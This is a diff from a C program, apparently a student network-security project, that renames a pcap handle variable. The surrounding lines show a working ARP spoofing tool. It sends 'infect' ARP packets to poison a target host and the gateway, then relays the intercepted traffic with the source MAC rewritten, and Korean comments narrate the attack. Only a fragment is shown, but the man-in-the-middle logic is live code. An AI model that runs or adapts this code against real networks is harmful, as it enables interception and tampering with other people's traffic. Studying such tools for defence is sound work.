@@ -5,7 +5,7 @@ void *thread_infect(void *arg) //감염패킷킷
 {
 
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t *pcapHandle = pcap_open_live("enp0s3", BUFSIZ, 1, 1, errbuf);
+    pcap_t *pcap_handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1, errbuf);
 
     struct infect_addr_save *addr_save = (struct infect_addr_save *)arg;
 
@@ -63,7 +63,7 @@ void *thread_infect(void *arg) //감염패킷킷
         else
             infect->arp_target_ip = addr_save->save_gateway_ip;
 
-        int res = pcap_sendpacket(pcapHandle, pkt, sizeof(pkt));
+        int res = pcap_sendpacket(pcap_handle, pkt, sizeof(pkt));
         sw += 1;
         if (res == -1)
             printf(" error\n");
@@ -79,13 +79,13 @@ void *thread_relay(void *arg)
     struct infect_addr_save *add_save = (struct infect_addr_save *)arg;
     char errbuf[PCAP_ERRBUF_SIZE];
     int res;
-    pcap_t *pcapHandle = pcap_open_live("enp0s3", BUFSIZ, 1, 1, errbuf);
+    pcap_t *pcap_handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1, errbuf);
     struct pcap_pkthdr *header;
     const u_char *packet;
 
     while (1)
     {
-        pcap_next_ex(pcapHandle, &header, &packet);
+        pcap_next_ex(pcap_handle, &header, &packet);
 
         u_int pktsize = header->caplen;
         u_char cp_packet[pktsize];
@@ -104,7 +104,7 @@ void *thread_relay(void *arg)
                 eth_hdr->ether_shost[i] = mymac[i];
             }
             memcpy(cp_packet, packet, pktsize);
-            res = pcap_sendpacket(pcapHandle, cp_packet, (int)pktsize);
+            res = pcap_sendpacket(pcap_handle, cp_packet, (int)pktsize);
             if (res == -1)
             {
                 printf(" error\n");
@@ -126,7 +126,7 @@ void *thread_relay(void *arg)
                 eth_hdr->ether_shost[i] = mymac[i];
             }
             memcpy(cp_packet, packet, pktsize);
-            res = pcap_sendpacket(pcapHandle, cp_packet, (int)pktsize);
+            res = pcap_sendpacket(pcap_handle, cp_packet, (int)pktsize);
             if (res == -1)
                 printf(" error\n");
             else
@@ -174,13 +174,13 @@ int main(int argc, char *argv[])
         inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, myip, sizeof(struct sockaddr));
     }
 
-    pcap_t *pcapHandle;
+    pcap_t *pcap_handle;
     const u_char *packet;
     struct pcap_pkthdr *header;
 
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcapHandle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-    if (pcapHandle == NULL)
+    pcap_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    if (pcap_handle == NULL)
     {
         fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
         return -1;
@@ -188,7 +188,7 @@ int main(int argc, char *argv[])
 
     for (int i = 1; i <= argc / 2 - 1; i++)
     {
-        broadcast(argv, pcapHandle); //최초 감염 시작. for문 다 돌기전에 reply 패킷 오는지 확인 해야함.
+        broadcast(argv, pcap_handle); //최초 감염 시작. for문 다 돌기전에 reply 패킷 오는지 확인 해야함.
     }
 
     struct infect_addr_save *infect_addr_save;
@@ -196,7 +196,7 @@ int main(int argc, char *argv[])
     while (1)
     {
         //감염 패킷 쓰레드
-        pcap_next_ex(pcapHandle, &header, &packet);
+        pcap_next_ex(pcap_handle, &header, &packet);
         struct eth_arp_header *receive_packet = (struct eth_arp_header *)packet;
 
         infect_addr_save = (struct infect_addr_save *)malloc(sizeof(struct infect_addr_save));
@@ -214,12 +214,12 @@ int main(int argc, char *argv[])
         }
     }
     sleep(2);
-    gateway_mac(argv, pcapHandle);
+    gateway_mac(argv, pcap_handle);
 
     sleep(1);
     while (1)
     {
-        pcap_next_ex(pcapHandle, &header, &packet);
+        pcap_next_ex(pcap_handle, &header, &packet);
         struct eth_arp_header *receive_packet = (struct eth_arp_header *)packet;
         // 공격 대상에서 reply가 왔다면 패킷 relay 시작
         if (check_mac(receive_packet->eth_dst_mac, mymac) == 1 && receive_packet->arp_sender_ip == infect_addr_save->save_gateway_ip && ntohs(receive_packet->type) == ETHERTYPE_ARP && ntohs(receive_packet->opcode) == ARPOP_REPLY)
@@ -240,7 +240,7 @@ int main(int argc, char *argv[])
         printf("Search\n");
     }
 
-    pcap_close(pcapHandle);
+    pcap_close(pcap_handle);
     free(infect_addr_save);
     return 0;
 }
